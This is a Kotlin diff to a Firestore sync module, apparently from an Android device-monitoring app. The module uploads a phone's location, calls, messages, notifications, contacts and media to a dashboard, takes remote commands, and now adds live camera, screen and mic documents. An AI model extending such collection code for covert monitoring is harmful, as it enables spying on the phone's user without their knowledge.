@@ -12,24 +12,30 @@ import java.util.UUID
  * جميع مسارات Firestore المستخدمة في التطبيق ولوحة التحكم.
  *
  * users/{uid}/devices/{deviceId}
- * users/{uid}/devices/{deviceId}/{locations|calls|messages|notifications|contacts|media|commands}
+ * users/{uid}/devices/{deviceId}/{locations|calls|messages|notifications|contacts|media|commands|live}
+ *
+ * مجموعة live تحتوي وثائق ثابتة: front, back, screen, mic, status
+ * (تحديث وثيقة واحدة لكل لقطة يوفّر الكتابات ويجعل العرض فورياً).
  */
 object FirestoreSync {
 
     const val COLLECTION_USERS = "users"
     const val COLLECTION_DEVICES = "devices"
+    const val COLLECTION_LIVE = "live"
 
     private var initialized = false
 
-    /** تفعيل التخزين المحلي المؤقت لإعادة الرفع تلقائياً عند عودة الاتصال. */
     @Synchronized
     fun init(context: Context) {
+        StorageUploader.appContext = context.applicationContext
         if (initialized) return
         initialized = true
-        val settings = FirebaseFirestoreSettings.Builder()
-            .setPersistenceEnabled(true)
-            .build()
-        db().firestoreSettings = settings
+        try {
+            val settings = FirebaseFirestoreSettings.Builder()
+                .setPersistenceEnabled(true)
+                .build()
+            db().setFirestoreSettings(settings)
+        } catch (e: Exception) { /* تم التهيئة مسبقاً */ }
     }
 
     fun db(): FirebaseFirestore = FirebaseFirestore.getInstance()
@@ -51,7 +57,6 @@ object FirestoreSync {
     fun subRef(uid: String, deviceId: String, name: String) =
         deviceRef(uid, deviceId).collection(name)
 
-    /** ربط الجهاز بحساب المستخدم مع بيانات أساسية. */
     fun bindDevice(context: Context, info: Map<String, Any>) {
         val uid = uid() ?: return
         deviceRef(uid, deviceId(context)).set(info, SetOptions.merge())
@@ -62,16 +67,46 @@ object FirestoreSync {
         deviceRef(uid, deviceId(context)).set(status, SetOptions.merge())
     }
 
+    /** كتابة الموقع: وثيقة الجهاز + سجل المواقع + وثيقة live/status. */
     fun writeLocation(context: Context, location: Map<String, Any>) {
         val uid = uid() ?: return
         val did = deviceId(context)
-        deviceRef(uid, did).set(mapOf("location" to location), SetOptions.merge())
-        subRef(uid, did, "locations").add(location)
+        val withTs = if (location.containsKey("timestamp")) location else
+            location + ("timestamp" to System.currentTimeMillis())
+        deviceRef(uid, did).set(mapOf("location" to withTs), SetOptions.merge())
+        subRef(uid, did, "locations").add(withTs)
+        setLive(context, "location", withTs)
     }
 
     fun appendItem(context: Context, collection: String, item: Map<String, Any>) {
         val uid = uid() ?: return
-        subRef(uid, deviceId(context), collection).add(item)
+        val data = if (item.containsKey("timestamp")) item else
+            item + ("timestamp" to System.currentTimeMillis())
+        subRef(uid, deviceId(context), collection).add(data)
+    }
+
+    /** تحديث وثيقة بث مباشر (front/back/screen/mic) بدل إنشاء وثائق لا نهائية. */
+    fun setLive(context: Context, kind: String, data: Map<String, Any>) {
+        val uid = uid() ?: return
+        subRef(uid, deviceId(context), COLLECTION_LIVE).document(kind).set(
+            data + ("updatedAt" to System.currentTimeMillis()),
+            SetOptions.merge(),
+        )
+    }
+
+    /** تسجيل خطأ تشغيلي ليظهر في لوحة التحكم بدل الفشل الصامت. */
+    fun logError(context: Context, source: String, message: String) {
+        val uid = uid() ?: return
+        try {
+            subRef(uid, deviceId(context), "media").add(
+                mapOf(
+                    "name" to "خطأ: $source",
+                    "type" to "error",
+                    "error" to message.take(500),
+                    "timestamp" to System.currentTimeMillis(),
+                ),
+            )
+        } catch (e: Exception) { /* تجاهل */ }
     }
 
     /** الاستماع للأوامر المعلّقة من لوحة التحكم. */
@@ -82,6 +117,7 @@ object FirestoreSync {
         val uid = uid() ?: return null
         return subRef(uid, deviceId(context), "commands")
             .whereEqualTo("status", "pending")
+            .limit(20)
             .addSnapshotListener { snapshot, error ->
                 if (error != null || snapshot == null) return@addSnapshotListener
                 for (doc in snapshot.documents) {
@@ -102,7 +138,7 @@ object FirestoreSync {
             mapOf(
                 "status" to status,
                 "result" to result,
-                "updatedAt" to com.google.firebase.firestore.FieldValue.serverTimestamp(),
+                "resultAt" to System.currentTimeMillis(),
             ),
             SetOptions.merge(),
         )
